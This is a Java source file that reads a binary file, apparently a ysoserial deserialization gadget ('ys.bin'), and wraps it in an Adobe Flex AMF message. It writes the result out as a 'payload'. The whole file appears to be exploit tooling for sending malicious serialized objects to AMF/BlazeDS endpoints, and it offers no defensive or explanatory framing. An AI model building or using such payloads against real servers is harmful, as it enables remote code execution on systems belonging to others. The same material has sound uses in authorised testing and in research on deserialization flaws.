import flex.messaging.io.amf.MessageBody;
import flex.messaging.io.amf.ActionMessage;
import flex.messaging.io.SerializationContext;
import flex.messaging.io.amf.AmfMessageSerializer;
import java.io.*;

public class ACSFlex {
    public static void main(String[] args) {
        try {
            // Read binary data from ys.bin
            byte[] binData = readBinaryFile(args[0]);

            // Serialize binary data to AMF message
            byte[] amf = serialize(binData);

            // Write the serialized AMF message to the output file
            DataOutputStream os = new DataOutputStream(new FileOutputStream(args[1]));
            os.write(amf);
            System.out.println("Done, payload written to " + args[1]);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    // Method to read binary data from a file
    public static byte[] readBinaryFile(String filePath) throws IOException {
        File file = new File(filePath);
        byte[] data = new byte[(int) file.length()];
        try (FileInputStream fis = new FileInputStream(file)) {
            fis.read(data);
        }
        return data;
    }

    // Method to serialize data to AMF message
    public static byte[] serialize(Object data) throws IOException {
        MessageBody body = new MessageBody();
        body.setData(data);

        ActionMessage message = new ActionMessage();
        message.addBody(body);

        ByteArrayOutputStream out = new ByteArrayOutputStream();

        AmfMessageSerializer serializer = new AmfMessageSerializer();
        serializer.initialize(SerializationContext.getSerializationContext(), out, null);
        serializer.writeMessage(message);

        return out.toByteArray();
    }
}
